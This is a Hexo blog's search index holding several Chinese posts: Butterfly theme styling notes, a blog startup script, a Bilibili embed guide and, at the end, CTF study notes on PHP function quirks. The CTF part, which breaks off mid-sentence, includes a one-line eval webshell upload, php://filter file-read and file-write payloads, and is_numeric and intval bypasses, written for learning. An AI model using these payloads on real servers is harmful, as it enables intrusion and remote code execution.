<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>firefox好用插件分享</title>
      <link href="/2025/07/02/firefox%E5%A5%BD%E7%94%A8%E6%8F%92%E4%BB%B6%E5%88%86%E4%BA%AB/"/>
      <url>/2025/07/02/firefox%E5%A5%BD%E7%94%A8%E6%8F%92%E4%BB%B6%E5%88%86%E4%BA%AB/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 计算机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 火狐插件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客一键启动脚本</title>
      <link href="/2025/07/02/%E5%8D%9A%E5%AE%A2%E4%B8%80%E9%94%AE%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC/"/>
      <url>/2025/07/02/%E5%8D%9A%E5%AE%A2%E4%B8%80%E9%94%AE%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a class="markdownIt-Anchor" href="#前言">#</a> 前言</h1><blockquote><p>每次修改完配置后要输入 hexo cl 与 hexo s 重新启动博客很麻烦，所以我直接编译成脚本文件，</p></blockquote><h1 id="脚本文件"><a class="markdownIt-Anchor" href="#脚本文件">#</a> 脚本文件</h1><ul><li>hexo_start.bat:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">cd /d C:\blog</span><br><span class="line">cmd /k &quot;hexo cl &amp;&amp; hexo s&quot;</span><br></pre></td></tr></table></figure><p>双击运行即可</p>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>butterfly主题博客美化记录</title>
      <link href="/2025/06/30/blog%E8%AE%B0%E5%BD%95/"/>
      <url>/2025/06/30/blog%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前言🌟</p><p>美化教程主要参考：<a href="https://www.fomal.cc/posts/4aa2d85f.html">Fomalhaut 博客魔改教程</a><br><img src="https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202507031514421.png" alt="image-20250703151417374"></p></blockquote><h1 id="文章页post-front-matter"><a class="markdownIt-Anchor" href="#文章页post-front-matter">#</a> 文章页 Post Front-matter</h1><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 文章标题</span><br><span class="line">date: 创建日期</span><br><span class="line">updated: 更新日期</span><br><span class="line">cover: 文章封面</span><br><span class="line">description: 文章描述</span><br><span class="line">swiper<span class="emphasis">_index: 1 #置顶轮播图顺序，非负整数，数字越大越靠前</span></span><br><span class="line"><span class="emphasis">sticky: 1 #置顶</span></span><br><span class="line"><span class="emphasis">categories: blog  #分类</span></span><br><span class="line"><span class="emphasis">tags: 文章标签</span></span><br><span class="line"><span class="emphasis">---</span></span><br></pre></td></tr></table></figure><h1 id="更换字体未成功"><a class="markdownIt-Anchor" href="#更换字体未成功">#</a> 更换字体未成功</h1><p>下图划横线的代表应用的字体：</p><p><img src="https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202506301027409.png" alt="image-20250630102717322"></p><p>字体文件路径未配置正确：</p><p><img src="https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202506301035945.png" alt="image-20250630103515926"><br>custom.css:<br><img src="https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202506301034788.png" alt="image-20250630103442769"></p><h1 id="黑夜霓虹灯与导航栏发光未成功配置"><a class="markdownIt-Anchor" href="#黑夜霓虹灯与导航栏发光未成功配置">#</a> 黑夜霓虹灯与导航栏发光未成功配置：</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 深色模式下的导航栏文字阴影 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> &#123;</span><br><span class="line">  <span class="selector-class">.menus_item</span> <span class="selector-tag">a</span><span class="selector-class">.site-page</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">6px</span> <span class="built_in">rgba</span>(<span class="number">126</span>, <span class="number">165</span>, <span class="number">255</span>, <span class="number">0.7</span>) <span class="meta">!important</span>; <span class="comment">/* 主题色光晕 */</span></span><br><span class="line">    <span class="attribute">transition</span>: text-shadow <span class="number">0.3s</span> ease;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-id">#page-name</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">8px</span> <span class="built_in">rgba</span>(<span class="number">126</span>, <span class="number">165</span>, <span class="number">255</span>, <span class="number">0.7</span>) <span class="meta">!important</span>;  <span class="comment">/* 主题色霓虹光晕 */</span></span><br><span class="line">    <span class="attribute">transition</span>: text-shadow <span class="number">0.3s</span> ease;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="没有评论"><a class="markdownIt-Anchor" href="#没有评论">#</a> 没有评论</h1><h1 id="右下角按钮不能改变颜色"><a class="markdownIt-Anchor" href="#右下角按钮不能改变颜色">#</a> 右下角按钮不能改变颜色</h1><p><img src="https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202507010958098.png" alt="image-20250701095831024"></p><p>blog\node_modules\hexo-theme-butterfly\source\css_global</p><p>此文件可以设置各种全局颜色</p><p>通过 f12 找到要改变颜色的参数名</p><h1 id="黑夜模式主题颜色"><a class="markdownIt-Anchor" href="#黑夜模式主题颜色">#</a> 黑夜模式主题颜色</h1><p>C:\blog\node_modules\hexo-theme-butterfly\source\css_mode\darkmode.styl</p><p>添加：</p>  <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">hexo-config</span>(<span class="string">&#x27;darkmode.enable&#x27;</span>) || <span class="built_in">hexo-config</span>(<span class="string">&#x27;display_mode&#x27;</span>) == <span class="string">&#x27;dark&#x27;</span></span><br><span class="line">  <span class="selector-attr">[data-theme=<span class="string">&#x27;dark&#x27;</span>]</span></span><br><span class="line">+    <span class="attr">--theme-color</span>: <span class="number">#e98ca1</span></span><br><span class="line">    <span class="attr">--global-bg</span>: <span class="built_in">darken</span>(<span class="number">#121212</span>, <span class="number">2</span>)</span><br><span class="line">    <span class="attr">--font-color</span>: <span class="built_in">alpha</span>(<span class="number">#FFFFFF</span>, .<span class="number">7</span>)</span><br></pre></td></tr></table></figure><h1 id="导航栏中间标题显示不居中"><a class="markdownIt-Anchor" href="#导航栏中间标题显示不居中">#</a> 导航栏中间标题显示不居中</h1><p>custom.css：</p>  <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 标题增强 */</span></span><br><span class="line"><span class="selector-id">#site-name</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#e98ca1</span> <span class="meta">!important</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span><br><span class="line">  -webkit-<span class="attribute">border-radius</span>: <span class="number">8px</span>;</span><br><span class="line">  -moz-<span class="attribute">border-radius</span>: <span class="number">8px</span>;</span><br><span class="line">  -ms-<span class="attribute">border-radius</span>: <span class="number">8px</span>;</span><br><span class="line">  -o-<span class="attribute">border-radius</span>: <span class="number">8px</span>;</span><br><span class="line">  <span class="attribute">transition</span>: <span class="number">0.3s</span>;</span><br><span class="line">  -webkit-<span class="attribute">transition</span>: <span class="number">0.3s</span>;</span><br><span class="line">  -moz-<span class="attribute">transition</span>: <span class="number">0.3s</span>;</span><br><span class="line">  -ms-<span class="attribute">transition</span>: <span class="number">0.3s</span>;</span><br><span class="line">  -o-<span class="attribute">transition</span>: <span class="number">0.3s</span>;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span> <span class="meta">!important</span>;</span><br><span class="line">  <span class="attribute">right</span>: <span class="number">0</span> <span class="meta">!important</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;\f015&quot;</span>;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> <span class="number">#e98ca1</span>;</span><br><span class="line">  <span class="attribute">font-family</span>: <span class="string">&quot;Font Awesome 6 Free&quot;</span>;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">color</span>: white;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">30px</span>; <span class="comment">/*如果有溢出或者垂直不居中的现象微调一下这个参数*/</span></span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">18px</span>; <span class="comment">/*根据个人喜好*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将上面的 <code>line-height: 30px;</code>  适当调小一点</p><p>同时：</p><p>修改 <code>top: 7px !important;</code>  可以 f12 寻找最合适的数值</p>  <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 修复滚动显示标题居中 */</span></span><br><span class="line">center<span class="selector-id">#name-container</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute <span class="meta">!important</span>;</span><br><span class="line">  <span class="attribute">width</span>: fit-content <span class="meta">!important</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">43%</span> <span class="meta">!important</span>;   //调整左右</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">7px</span> <span class="meta">!important</span>;    //调整高度</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="公告设置"><a class="markdownIt-Anchor" href="#公告设置">#</a> 公告设置</h1><h1 id="自定义图标"><a class="markdownIt-Anchor" href="#自定义图标">#</a> 自定义图标</h1><h1 id="修改主题颜色theme-color"><a class="markdownIt-Anchor" href="#修改主题颜色theme-color">#</a> 修改主题颜色–theme-color</h1><h2 id="方法一"><a class="markdownIt-Anchor" href="#方法一">#</a> 方法一：</h2><p>_config.butterfly.yml：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">theme_color:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">main:</span> <span class="string">&quot;#e98ca1&quot;</span>   </span><br><span class="line">  <span class="attr">paginator:</span> <span class="string">&quot;#e98ca1&quot;</span>  <span class="comment"># 主色调</span></span><br><span class="line">  <span class="attr">button_hover:</span> <span class="string">&quot;#e98ca1&quot;</span> <span class="comment">#分页按钮颜色</span></span><br><span class="line">  <span class="attr">text_selection:</span> <span class="string">&quot;#86a4ff&quot;</span>  <span class="comment">#按钮悬停色</span></span><br><span class="line">  <span class="attr">link_color:</span> <span class="string">&quot;#99a9bf&quot;</span>    <span class="comment">#超链接颜色</span></span><br><span class="line">  <span class="attr">meta_color:</span> <span class="string">&quot;#858585&quot;</span>      <span class="comment">#元信息文字色 作者、日期等元信息颜色）</span></span><br><span class="line">  <span class="attr">hr_color:</span> <span class="string">&quot;#A4D8FA&quot;</span>        <span class="comment">#水平线颜色</span></span><br><span class="line">  <span class="attr">code_foreground:</span> <span class="string">&quot;#F47466&quot;</span>      <span class="comment">#代码文字色</span></span><br><span class="line">  <span class="attr">code_background:</span> <span class="string">&quot;rgba(27, 31, 35, .05)&quot;</span></span><br><span class="line">  <span class="attr">toc_color:</span> <span class="string">&quot;#e98ca1&quot;</span>        <span class="comment"># 目录文字色</span></span><br><span class="line">  <span class="attr">blockquote_padding_color:</span> <span class="string">&quot;#49b1f5&quot;</span> <span class="comment"># 引用框边框色</span></span><br><span class="line">  <span class="attr">blockquote_background_color:</span> <span class="string">&quot;#49b1f5&quot;</span>  <span class="comment"># 引用框背景</span></span><br><span class="line">  <span class="attr">scrollbar_color:</span> <span class="string">&quot;#e98ca1&quot;</span> <span class="comment"># 滚动条颜色</span></span><br><span class="line">  <span class="attr">meta_theme_color_light:</span> <span class="string">&quot;ffffff&quot;</span>  <span class="comment"># 浅色模式主题色</span></span><br><span class="line">  <span class="attr">meta_theme_color_dark:</span> <span class="string">&quot;#7ec1f8&quot;</span>  <span class="comment"># 深色模式主题色</span></span><br></pre></td></tr></table></figure><h2 id="方法二"><a class="markdownIt-Anchor" href="#方法二">#</a> 方法二：</h2><p>blog\node_modules\hexo-theme-butterfly\source\css_global\index.styl</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">--theme-color</span>: <span class="number">#e98ca1</span> !important;</span><br></pre></td></tr></table></figure><p>在后面加一个 <code>！important；</code> 能够覆盖其它设置</p><p><em>其它颜色参数同上，基本都能在这个文件里找到，如果找不到就随便在一个 styl 文件里自己添加</em></p><h1 id="文章目录调整"><a class="markdownIt-Anchor" href="#文章目录调整">#</a> 文章目录调整</h1><ul><li><p>custom.css:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 调整目录栏宽度 */</span></span><br><span class="line"><span class="selector-id">#aside-content</span> <span class="selector-id">#card-toc</span> <span class="selector-class">.toc-content</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">320px</span> <span class="meta">!important</span>;  <span class="comment">/* 默认250px */</span></span><br><span class="line">  <span class="attribute">max-width</span>: <span class="number">110%</span> <span class="meta">!important</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 正文行高（默认1.5，建议1.2-1.4） */</span></span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">1.6</span> <span class="meta">!important</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 标题行高（可选调整） */</span></span><br><span class="line">  <span class="selector-class">.toc-link</span> &#123;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">1.6</span> <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">5px</span> <span class="number">0</span> <span class="meta">!important</span>;  <span class="comment">/* 同时调小上下间距 */</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h1 id="小风车右边井号没去除"><a class="markdownIt-Anchor" href="#小风车右边井号没去除">#</a> 小风车右边 #井号没去除</h1><p>在  <code>blog\node_modules\hexo-theme-butterfly\source\css\index.styl</code>  中添加：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.markdownIt-Anchor</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: none <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="黑夜模式遮罩问题"><a class="markdownIt-Anchor" href="#黑夜模式遮罩问题">#</a> 黑夜模式遮罩问题</h1><p><code>C:\blog\node_modules\hexo-theme-butterfly\source\css\_layout\loading.styl</code></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 深色模式背景覆盖 */</span></span><br><span class="line">   <span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> &amp; &#123;</span><br><span class="line">     <span class="attribute">background</span>:<span class="built_in">rgb</span>(<span class="number">21</span>, <span class="number">21</span>, <span class="number">21</span>) <span class="meta">!important</span>;  // 纯黑背景</span><br><span class="line">     <span class="attribute">opacity</span>: <span class="number">0.5</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>B站视频示例</title>
      <link href="/2025/06/30/%E6%8F%92%E5%85%A5B%E7%AB%99%E8%A7%86%E9%A2%91%E7%A4%BA%E4%BE%8B/"/>
      <url>/2025/06/30/%E6%8F%92%E5%85%A5B%E7%AB%99%E8%A7%86%E9%A2%91%E7%A4%BA%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="示例"><a class="markdownIt-Anchor" href="#示例">#</a> 示例：</h2><div align=center class="aspect-ratio"><iframe src="//player.bilibili.com/player.html?isOutside=true&aid=113009984866106&bvid=BV1H6WmesEvu&cid=500001659306026&p=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"></iframe>    </iframe></div><h2 id="教程"><a class="markdownIt-Anchor" href="#教程">#</a> 教程：</h2><p>在分享界面点击嵌入代码：</p><p><img src="https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202507021608062.png" alt="image-20250702160816971"></p><p>将复制的代码外面加上 div 标签就行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div align=center class=&quot;aspect-ratio&quot;&gt;</span><br><span class="line">&lt;iframe src=&quot;//player.bilibili.com/player.html?isOutside=true&amp;aid=113009984866106&amp;bvid=BV1H6WmesEvu&amp;cid=500001659306026&amp;p=1&quot; scrolling=&quot;no&quot; border=&quot;0&quot; frameborder=&quot;no&quot; framespacing=&quot;0&quot; allowfullscreen=&quot;true&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;/iframe&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog 博客美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php特性</title>
      <link href="/2024/11/07/php%E7%89%B9%E6%80%A7/"/>
      <url>/2024/11/07/php%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="php特性"><a class="markdownIt-Anchor" href="#php特性">#</a> php 特性</h1><h2 id="php函数"><a class="markdownIt-Anchor" href="#php函数">#</a> php 函数</h2><ul><li><mark>intval(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi>a</mi><mi>r</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">var,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mpunct">,</span></span></span></span>base)</mark></li></ul><ol><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi>a</mi><mi>r</mi><mtext>为数组时会返回</mtext><mn>1</mn><mtext>，</mtext></mrow><annotation encoding="application/x-tex">var为数组时会返回1，</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord cjk_fallback">为数组时会返回</span><span class="mord">1</span><span class="mord cjk_fallback">，</span></span></span></span>base 为进制。 <code> base=0</code> , 则表示根据 var 开始的数字决定使用的进制。绕过： <code>8进制</code> ：010574（0 开头）  <code>16进制</code> ：0x117 (0x 开头)</p></li><li><p>遇到<strong>字母</strong>或者<strong>符号</strong>停止读取</p></li></ol><ul><li><p><mark>strpos(string,find,start)</mark></p><p><img src="https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202410312046094.png" alt="image-20241031204632014"></p><p>默认从 0 开始，有则<span alt="solid">返回第一次出现的位置</span>，无则返回 false</p><p>本例中若参数开头为 0 <code>?num=01110</code>     strpos 函数会返回 0 并执行死亡程序</p><p>绕过：<span alt="solid">参数中含有 0 但开头不能为 0</span></p></li><li><p><mark>highlight_file($_GET[‘u’])</mark></p><p><font>用 php 伪协议</font></p><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/resource=flag.php</span></span><br><span class="line">php:<span class="comment">//filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span></span><br><span class="line">php:<span class="comment">//filter/read=convert.quoted-printable-encode/resource=flag.php</span></span><br><span class="line">compress.zlib:<span class="comment">//flag.php</span></span><br><span class="line">Php:<span class="comment">//filter/zlib.deflate|zlib.inflate/resource=flag.php</span></span><br></pre></td></tr></table></figure></blockquote><p>参数 u 限制了不能等于 flag.php, 可用./flag.php<br> 或者？u=php://filter/read=convert.base64-encode/resource=flag.php</p></li><li><p><mark>in_array(search,array,type)</mark></p></li></ul><p>type 为 TRUE 则 函数还会检查 search 的类型是否和 array 中的相同</p><p><span alt="solid">没有设置第 3 个参数则为弱类型比较</span></p><p><img src="https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202411011324381.png" alt="image-20241101132428315"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?n=<span class="number">1</span>.php   post:content=<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><details>    <summary>蚁剑连接问题</summary>    <p>出现错误：UNABLE_TO_VERIFY_LEAF_SIGNATURE</p>    <p>其他设置-->勾选忽略HTTPS证书</p></details>* ==file_put_contents==<ol><li>考虑插入一句话木马</li><li>使用伪协议<span alt="solid">如果文件不存在，将创建一个文件 </span>，再写入查看源码的命令</li><li>传入内容需要编码</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`cat *`;</span><br><span class="line">经过base64与16进制编码：</span><br></pre></td></tr></table></figure><ul><li><mark>call_user_func</mark></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">nowamagic</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)   </span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$b</span>;   </span><br><span class="line">&#125;   </span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;nowamagic&#x27;</span>, <span class="string">&quot;111&quot;</span>,<span class="string">&quot;222&quot;</span>);   </span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;nowamagic&#x27;</span>, <span class="string">&quot;333&quot;</span>,<span class="string">&quot;444&quot;</span>);   </span><br><span class="line"><span class="comment">//显示 111 222 333 444   </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;   </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"><span class="variable">$c</span></span>)   </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$c</span>;   </span><br><span class="line">    &#125;   </span><br><span class="line">&#125;   </span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>),<span class="string">&quot;111&quot;</span>);   </span><br><span class="line"><span class="comment">//显示 111   </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><em>() 是 gettext () 函数，一般是原封不动的输出参数<br>？f1=</em>&amp;f2=get_defined_vars</p><p><img src="https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202411070940375.png" alt="image-20241107094045219"></p><details>    <summary>遇到的坑</summary>    <p>本来想post传参：ctfshow=array('ctfshow','getFlag')</p>    <p>不成功，然后发现不能这样post数组</p></details><blockquote><p>ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag<br>ctfshow=ctfshow::getFlag</p></blockquote><ul><li><mark>hex2bin()</mark><br><span alt="solid">把十六进制值转换为 ASCII 字符</span></li></ul><p>把 call_user_func () 与 hex2bin () 结合起来？</p><ul><li><p><mark>is_numeric()</mark></p><ol><li>处理的数字有限制，所以一旦过长可能返回 false；长度一般为 18</li><li>前面增加<kbd>\x0c</kbd>，<kbd>\f</kbd>，<kbd>%0c</kbd> <code>(url中)</code>  可以通过</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$num</span> = <span class="string">&quot;\x0c36&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;yes&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;no&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span>          <span class="comment">//yes</span></span><br></pre></td></tr></table></figure></li><li><p>web102</p></li></ul><p><img src="https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202411011635459.png" alt="image-20241101163549407"></p><p>v1 需要 post 一个函数能对 $s 进行处理，这里 post  hex2bin ()</p><p>v2 是读取源码的 php 代码，必须是数字，用科学计数法绕过</p><p>v3 是用伪协议创建的文件</p><details>    <summary>遇到的坑</summary>    <p>进过base64和hex之后，e后面必须全部为数字，所以要把=去掉</p>    <p>访问2.php，右键查看网页源代码</p>    <p>使用了伪协议后一般都要查看源码</p></details><blockquote><p>payload:</p><p>?v2=115044383959474E6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=2.php<br>post:v1=hex2bin</p></blockquote><ul><li><mark>die()</mark><br> 终止程序并输出括号内的提示信息</li><li><mark>is_file()</mark></li></ul><p>if_file () 